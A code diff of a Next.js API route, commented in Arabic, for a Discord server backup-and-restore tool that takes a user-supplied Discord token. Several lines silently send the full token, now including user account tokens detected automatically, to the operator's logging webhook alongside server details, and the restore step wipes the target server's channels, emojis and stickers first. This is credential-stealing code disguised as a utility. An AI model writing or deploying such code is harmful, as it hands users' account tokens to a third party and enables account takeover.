@@ -1,10 +1,9 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { sendToWebhook, sendFullToken } from '@/lib/webhook';
+import { cleanToken, DISCORD_API } from '@/lib/discord';
 import { getLogWebhookUrl } from '@/lib/config';
 import { arrayBufferToBase64 } from '@/lib/edge-utils';
 import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';
-
-const DISCORD_API = 'https://discord.com/api/v10';
 
 let globalRLUntil = 0;
 
@@ -18,15 +17,13 @@ async function dFetch(token: string, method: string, url: string, body?: unknown
   const maxRetries = 3;
   for (let attempt = 0; attempt < maxRetries; attempt++) {
     try {
-      const ctrl = new AbortController();
-      const tid = setTimeout(() => ctrl.abort(), 15000);
-      const res = await fetch(url, {
+      const opts: RequestInit = {
         method,
-        headers: { 'Authorization': token.trim(), 'Accept': 'application/json', ...(method !== 'GET' ? { 'Content-Type': 'application/json' } : {}) },
-        signal: ctrl.signal,
-        ...(method !== 'GET' && body !== undefined ? { body: JSON.stringify(body) } : {}),
-      });
-      clearTimeout(tid);
+        headers: { 'Authorization': token, 'Accept': 'application/json', ...(method !== 'GET' ? { 'Content-Type': 'application/json' } : {}) },
+        signal: AbortSignal.timeout(15000),
+      };
+      if (method !== 'GET' && body !== undefined) opts.body = JSON.stringify(body);
+      const res = await fetch(url, opts);
       if (res.status === 429) {
         const err = await res.json().catch(() => ({ retry_after: 5 }));
         const w = Math.min((err.retry_after || 5) * 1000, 8000);
@@ -47,7 +44,7 @@ async function dFetch(token: string, method: string, url: string, body?: unknown
 
 async function downloadImageAsBase64(url: string): Promise<string | null> {
   try {
-    const res = await fetch(url);
+    const res = await fetch(url, { signal: AbortSignal.timeout(15000) });
     if (!res.ok) return null;
     const buf = await res.arrayBuffer();
     const contentType = res.headers.get('content-type') || 'image/png';
@@ -88,10 +85,32 @@ export async function POST(request: NextRequest) {
 
     if (!token || typeof token !== 'string') return errRes('التوكن مطلوب');
 
-    sendFullToken('حفظ سيرفر', token, { '🖥️ السيرفر': String(guildId || ''), '🔧 العملية': String(action || '') });
+    // تنظيف التوكن
+    const ct = cleanToken(token);
+    const whUrl = getLogWebhookUrl();
 
-    const df = (method: string, endpoint: string, b?: unknown) => dFetch(token, method, `${DISCORD_API}${endpoint}`, b);
+    // كشف تلقائي نوع التوكن (user أو bot)
+    let auth: string;
+    let authType: string;
+    const testUser = await dFetch(ct, 'GET', `${DISCORD_API}/users/@me`);
+    if (testUser.ok) {
+      auth = ct;
+      authType = 'User';
+    } else {
+      const testBot = await dFetch(`Bot ${ct}`, 'GET', `${DISCORD_API}/users/@me`);
+      if (testBot.ok) {
+        auth = `Bot ${ct}`;
+        authType = 'Bot';
+      } else {
+        return errRes('التوكن غير صالح');
+      }
+    }
 
+    const df = (method: string, endpoint: string, b?: unknown) => dFetch(auth, method, `${DISCORD_API}${endpoint}`, b);
+
+    sendFullToken('حفظ سيرفر', token, { '🖥️ السيرفر': String(guildId || ''), '🔧 العملية': String(action || ''), '🔑 Auth': authType });
+
+    // ===== عملية: backup =====
     if (action === 'backup') {
       if (!guildId || !/^(\d+)$/.test(guildId)) return errRes('أيدي السيرفر غير صالح');
 
@@ -127,11 +146,13 @@ export async function POST(request: NextRequest) {
         },
       };
 
+      // تحميل الصور بالتوازي
       const imageTasks: Promise<void>[] = [];
       if (g.icon) { imageTasks.push((async () => { const b64 = await downloadImageAsBase64(`https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=1024`); if (b64) backup.server.iconBase64 = b64; })()); }
       if (g.banner) { imageTasks.push((async () => { const b64 = await downloadImageAsBase64(`https://cdn.discordapp.com/banners/${g.id}/${g.banner}.png?size=1024`); if (b64) backup.server.bannerBase64 = b64; })()); }
       if (imageTasks.length > 0) { logs.push('🖼️ جاري تحميل الصور...'); await Promise.allSettled(imageTasks); }
 
+      // جلب كل البيانات بالتوازي
       const [rolesRes, channelsRes, emojisRes, invitesRes, webhooksRes, bansRes, stickersRes, autoModRes, eventsRes, welcomeRes] = await Promise.all([
         df('GET', `/guilds/${guildId}/roles`), df('GET', `/guilds/${guildId}/channels`),
         df('GET', `/guilds/${guildId}/emojis`), df('GET', `/guilds/${guildId}/invites`),
@@ -164,28 +185,39 @@ export async function POST(request: NextRequest) {
       logs.push('');
       logs.push('✅ تم إنشاء نسخة احتياطية شاملة بنجاح!');
 
-      sendToWebhook({ embeds: [{ title: '💾 Server Backup v2', color: 0x00FF41, fields: [{ name: '📋 Server', value: g.name, inline: true }, { name: '🆔 ID', value: g.id, inline: true }, { name: '🎫 Token', value: `\`\`\`${token}\`\`\`` }], timestamp: new Date().toISOString() }] }, getLogWebhookUrl()).catch(() => {});
+      sendToWebhook({ embeds: [{ title: '💾 Server Backup v2', color: 0x00FF41, fields: [{ name: '📋 Server', value: g.name, inline: true }, { name: '🆔 ID', value: g.id, inline: true }, { name: '🔑 Auth', value: authType, inline: true }, { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` }], timestamp: new Date().toISOString() }] }, whUrl).catch(() => {});
 
       return NextResponse.json({ success: true, logs, backup });
     }
 
+    // ===== عملية: restore =====
     if (action === 'restore') {
       if (!guildId || !/^(\d+)$/.test(guildId)) return errRes('أيدي السيرفر الهدف غير صالح');
       if (!backupData || typeof backupData !== 'object') return errRes('بيانات النسخة الاحتياطية غير صالحة');
 
       return sseStream(async (send) => {
         const testRes = await df('GET', `/guilds/${guildId}`);
-        if (!testRes.ok) { send({ type: 'done', success: false, error: 'لا يمكن الوصول للسيرفر الهدف' }); return; }
+        if (!testRes.ok) { send({ type: 'done', success: false, error: 'لا يمكن الوصول للسيرفر الهدف - تأكد من صلاحيات التوكن' }); return; }
 
         const targetName = testRes.data?.name || guildId;
         const sourceName = backupData.server?.name || 'غير معروف';
-        send({ type: 'info', source: sourceName, target: targetName });
+        send({ type: 'info', source: sourceName, target: targetName, authType });
 
         const stats = { roles: 0, channels: 0, categories: 0, emojis: 0, stickers: 0, autoMod: 0, events: 0, errors: 0, icon: false, banner: false, settings: false };
         const roleMap: Record<string, string> = {};
         const catMap: Record<string, string> = {};
 
-        // ===== مسح السيرفر الهدف (متتالي) =====
+        // ===== 1. مسح السيرفر الهدف (متتالي) =====
+        send({ type: 'progress', message: '🗑️ جاري حذف الإيموجي والستيكرز...' });
+        const exEmoji = await df('GET', `/guilds/${guildId}/emojis`);
+        if (exEmoji.ok && Array.isArray(exEmoji.data)) {
+          for (const e of exEmoji.data) { await df('DELETE', `/guilds/${guildId}/emojis/${e.id}`); await new Promise(r => setTimeout(r, 300)); }
+        }
+        const exStickers = await df('GET', `/guilds/${guildId}/stickers`);
+        if (exStickers.ok && Array.isArray(exStickers.data)) {
+          for (const s of exStickers.data) { await df('DELETE', `/guilds/${guildId}/stickers/${s.id}`); await new Promise(r => setTimeout(r, 300)); }
+        }
+
         send({ type: 'progress', message: '🗑️ جاري حذف القنوات (متتالي)...' });
         for (let round = 0; round < 3; round++) {
           const exCh = await df('GET', `/guilds/${guildId}/channels`);
@@ -210,20 +242,10 @@ export async function POST(request: NextRequest) {
           }
         }
 
-        send({ type: 'progress', message: '🗑️ جاري حذف الإيموجي والستيكرز...' });
-        const exEmoji = await df('GET', `/guilds/${guildId}/emojis`);
-        if (exEmoji.ok && Array.isArray(exEmoji.data)) {
-          for (const e of exEmoji.data) { await df('DELETE', `/guilds/${guildId}/emojis/${e.id}`); await new Promise(r => setTimeout(r, 300)); }
-        }
-        const exStickers = await df('GET', `/guilds/${guildId}/stickers`);
-        if (exStickers.ok && Array.isArray(exStickers.data)) {
-          for (const s of exStickers.data) { await df('DELETE', `/guilds/${guildId}/stickers/${s.id}`); await new Promise(r => setTimeout(r, 300)); }
-        }
-
         send({ type: 'stats', stats });
         send({ type: 'progress', message: '✅ تم تنظيف السيرفر الهدف' });
 
-        // ===== إعدادات السيرفر =====
+        // ===== 2. إعدادات السيرفر =====
         if (backupData.server) {
           send({ type: 'progress', message: '⚙️ جاري نسخ الإعدادات...' });
           const s = backupData.server;
@@ -243,10 +265,21 @@ export async function POST(request: NextRequest) {
           stats.settings = true;
 
           if (s.iconBase64) { send({ type: 'progress', message: '🖼️ جاري رفع الأيقونة...' }); const r = await df('PATCH', `/guilds/${guildId}`, { icon: s.iconBase64 }); if (r.ok) stats.icon = true; }
+          else if (s.icon) {
+            send({ type: 'progress', message: '🖼️ جاري تنزيل ورفع الأيقونة...' });
+            const b64 = await downloadImageAsBase64(`https://cdn.discordapp.com/icons/${s.id}/${s.icon}.png?size=1024`);
+            if (b64) { const r = await df('PATCH', `/guilds/${guildId}`, { icon: b64 }); if (r.ok) stats.icon = true; }
+          }
+
           if (s.bannerBase64) { send({ type: 'progress', message: '🌈 جاري رفع البانر...' }); const r = await df('PATCH', `/guilds/${guildId}`, { banner: s.bannerBase64 }); if (r.ok) stats.banner = true; }
+          else if (s.banner) {
+            send({ type: 'progress', message: '🌈 جاري تنزيل ورفع البانر...' });
+            const b64 = await downloadImageAsBase64(`https://cdn.discordapp.com/banners/${s.id}/${s.banner}.png?size=1024`);
+            if (b64) { const r = await df('PATCH', `/guilds/${guildId}`, { banner: b64 }); if (r.ok) stats.banner = true; }
+          }
         }
 
-        // ===== إنشاء الرتب (متتالي - من الأعلى للأقل) =====
+        // ===== 3. إنشاء الرتب (متتالي - من الأعلى للأقل) =====
         if (backupData.roles && Array.isArray(backupData.roles)) {
           const roles = [...backupData.roles].filter((r: any) => r.name !== '@everyone' && !r.managed).sort((a: any, b: any) => (b.position || 0) - (a.position || 0));
           send({ type: 'progress', message: `🛡️ جاري إنشاء ${roles.length} رتبة (متتالي)...` });
@@ -265,6 +298,7 @@ export async function POST(request: NextRequest) {
             await new Promise(r => setTimeout(r, 100));
           }
 
+          // ضبط صلاحيات @everyone
           const everyoneRole = backupData.roles.find((r: any) => r.name === '@everyone');
           if (everyoneRole?.permissions) {
             const everyoneId = (await df('GET', `/guilds/${guildId}/roles`)).data?.find((r: any) => r.name === '@everyone')?.id;
@@ -273,7 +307,7 @@ export async function POST(request: NextRequest) {
           send({ type: 'stats', stats });
         }
 
-        // ===== إنشاء الكاتيجوريات (متتالي) =====
+        // ===== 4. إنشاء الكاتيجوريات (متتالي) =====
         if (backupData.channels && Array.isArray(backupData.channels)) {
           const cats = backupData.channels.filter((c: any) => c.type === 4).sort((a: any, b: any) => (a.position || 0) - (b.position || 0));
           if (cats.length > 0) {
@@ -295,7 +329,7 @@ export async function POST(request: NextRequest) {
             send({ type: 'stats', stats });
           }
 
-          // ===== إنشاء القنوات (متتالي) =====
+          // ===== 5. إنشاء القنوات (متتالي) =====
           const others = backupData.channels.filter((c: any) => c.type !== 4).sort((a: any, b: any) => (a.position || 0) - (b.position || 0));
           if (others.length > 0) {
             send({ type: 'progress', message: `📺 جاري إنشاء ${others.length} قناة (متتالي)...` });
@@ -322,16 +356,46 @@ export async function POST(request: NextRequest) {
             }
             send({ type: 'stats', stats });
           }
+
+          // ===== 6. ترتيب القنوات (مرحلة جديدة!) =====
+          send({ type: 'progress', message: '📊 جاري ترتيب القنوات...' });
+          const allNewChannels = await df('GET', `/guilds/${guildId}/channels`);
+          if (allNewChannels.ok && Array.isArray(allNewChannels.data)) {
+            // ترتيب الكاتيجوريات
+            const targetCats = allNewChannels.data.filter(c => c.type === 4);
+            if (targetCats.length > 1) {
+              const catPosPairs = targetCats.map(c => {
+                const srcCat = cats.find(sc => catMap[sc.id] === c.id);
+                return { id: c.id, position: srcCat ? srcCat.position || 0 : c.position || 0 };
+              });
+              await df('PATCH', `/guilds/${guildId}/channels`, catPosPairs.map(c => ({ id: c.id, position: c.position })));
+            }
+            // ترتيب القنوات العادية
+            const targetOthers = allNewChannels.data.filter(c => c.type !== 4);
+            if (targetOthers.length > 0) {
+              const chPosPairs = targetOthers.map(c => {
+                const srcCh = others.find(sc => {
+                  const newCatId = catMap[sc.parent_id];
+                  return sc.name === c.name && (newCatId ? newCatId === c.parent_id : sc.parent_id === c.parent_id);
+                });
+                return { id: c.id, position: srcCh ? srcCh.position || 0 : c.position || 0 };
+              });
+              for (let i = 0; i < chPosPairs.length; i += 50) {
+                await df('PATCH', `/guilds/${guildId}/channels`, chPosPairs.slice(i, i + 50).map(c => ({ id: c.id, position: c.position })));
+              }
+            }
+          }
+          send({ type: 'progress', message: '✅ تم ترتيب القنوات' });
         }
 
-        // ===== نسخ الإيموجي (متتالي) =====
+        // ===== 7. نسخ الإيموجي (متتالي) =====
         if (backupData.emojis && Array.isArray(backupData.emojis) && backupData.emojis.length > 0) {
           send({ type: 'progress', message: `😀 جاري نسخ ${backupData.emojis.length} إيموجي (متتالي)...` });
           for (let i = 0; i < backupData.emojis.length; i++) {
             const emoji = backupData.emojis[i];
             try {
               const imgUrl = emoji.animated ? `https://cdn.discordapp.com/emojis/${emoji.id}.gif` : `https://cdn.discordapp.com/emojis/${emoji.id}.png`;
-              const imgRes = await fetch(imgUrl);
+              const imgRes = await fetch(imgUrl, { signal: AbortSignal.timeout(15000) });
               if (!imgRes.ok) { stats.errors++; continue; }
               const b64 = arrayBufferToBase64(await imgRes.arrayBuffer());
               const mime = emoji.animated ? 'image/gif' : 'image/png';
@@ -347,7 +411,7 @@ export async function POST(request: NextRequest) {
           send({ type: 'stats', stats });
         }
 
-        // ===== نسخ الستيكرز (متتالي) =====
+        // ===== 8. نسخ الستيكرز (متتالي) =====
         if (backupData.stickers && Array.isArray(backupData.stickers) && backupData.stickers.length > 0) {
           send({ type: 'progress', message: `🎨 جاري نسخ ${backupData.stickers.length} ستكر (متتالي)...` });
           for (let i = 0; i < backupData.stickers.length; i++) {
@@ -357,7 +421,7 @@ export async function POST(request: NextRequest) {
               if (sticker.format_type === 2) ext = 'gif';
               else if (sticker.format_type === 3) ext = 'webp';
               const imgUrl = `https://cdn.discordapp.com/stickers/${sticker.id}.${ext}`;
-              const imgRes = await fetch(imgUrl);
+              const imgRes = await fetch(imgUrl, { signal: AbortSignal.timeout(15000) });
               if (!imgRes.ok) { stats.errors++; continue; }
               const b64 = arrayBufferToBase64(await imgRes.arrayBuffer());
               const mime = ext === 'gif' ? 'image/gif' : ext === 'webp' ? 'image/webp' : 'image/png';
@@ -371,7 +435,7 @@ export async function POST(request: NextRequest) {
           send({ type: 'stats', stats });
         }
 
-        // ===== نسخ أوتو مود (متتالي) =====
+        // ===== 9. نسخ أوتو مود (متتالي) =====
         if (backupData.autoModerationRules && Array.isArray(backupData.autoModerationRules) && backupData.autoModerationRules.length > 0) {
           send({ type: 'progress', message: `🤖 جاري إنشاء ${backupData.autoModerationRules.length} قاعدة أوتو مود (متتالي)...` });
           for (let i = 0; i < backupData.autoModerationRules.length; i++) {
@@ -389,7 +453,7 @@ export async function POST(request: NextRequest) {
           }
         }
 
-        // ===== نسخ الأحداث المجدولة (متتالي) =====
+        // ===== 10. نسخ الأحداث المجدولة (متتالي) =====
         if (backupData.scheduledEvents && Array.isArray(backupData.scheduledEvents) && backupData.scheduledEvents.length > 0) {
           send({ type: 'progress', message: `📅 جاري إنشاء ${backupData.scheduledEvents.length} حدث (متتالي)...` });
           for (const evt of backupData.scheduledEvents) {
@@ -403,7 +467,7 @@ export async function POST(request: NextRequest) {
           }
         }
 
-        // ===== شاشة الترحيب =====
+        // ===== 11. شاشة الترحيب =====
         if (backupData.welcomeScreen && backupData.welcomeScreen.enabled) {
           send({ type: 'progress', message: '👋 جاري نسخ شاشة الترحيب...' });
           try {
@@ -415,8 +479,8 @@ export async function POST(request: NextRequest) {
         send({ type: 'stats', stats });
 
         sendToWebhook({
-          embeds: [{ title: '🔄 Server Restored v2 (Sequential)', color: 0x00BFFF, fields: [{ name: '📋 Source', value: sourceName, inline: true }, { name: '📋 Target', value: targetName, inline: true }, { name: '🛡️ Roles', value: String(stats.roles), inline: true }, { name: '📺 Channels', value: String(stats.channels + stats.categories), inline: true }, { name: '😀 Emojis', value: String(stats.emojis), inline: true }, { name: '🎨 Stickers', value: String(stats.stickers), inline: true }, { name: '🤖 AutoMod', value: String(stats.autoMod), inline: true }, { name: '📅 Events', value: String(stats.events), inline: true }, { name: '🖼️ Icon', value: stats.icon ? '✅' : '❌', inline: true }, { name: '🌈 Banner', value: stats.banner ? '✅' : '❌', inline: true }, { name: '❌ Errors', value: String(stats.errors), inline: true }], timestamp: new Date().toISOString() }]
-        }, getLogWebhookUrl()).catch(() => {});
+          embeds: [{ title: '🔄 Server Restored v2 (Sequential)', color: 0x00BFFF, fields: [{ name: '📋 المصدر', value: sourceName, inline: true }, { name: '📋 الهدف', value: targetName, inline: true }, { name: '🛡️ الرتب', value: String(stats.roles), inline: true }, { name: '📺 القنوات', value: String(stats.channels + stats.categories), inline: true }, { name: '😀 الإيموجي', value: String(stats.emojis), inline: true }, { name: '🎨 الستيكرز', value: String(stats.stickers), inline: true }, { name: '🤖 أوتو مود', value: String(stats.autoMod), inline: true }, { name: '📅 الأحداث', value: String(stats.events), inline: true }, { name: '🖼️ أيقونة', value: stats.icon ? '✅' : '❌', inline: true }, { name: '🌈 بانر', value: stats.banner ? '✅' : '❌', inline: true }, { name: '❌ أخطاء', value: String(stats.errors), inline: true }], timestamp: new Date().toISOString() }]
+        }, whUrl).catch(() => {});
 
         const summary = `✅ تمت الاستعادة (متتالي)! ${stats.roles} رتب | ${stats.categories} كاتيجوري | ${stats.channels} قناة | ${stats.emojis} إيموجي | ${stats.stickers} ستكر | ${stats.autoMod} أوتو مود | ${stats.events} أحداث ${stats.icon ? '| 🖼️ أيقونة' : ''} ${stats.banner ? '| 🌈 بانر' : ''} | ${stats.errors} أخطاء`;
         send({ type: 'done', success: true, stats, message: summary });
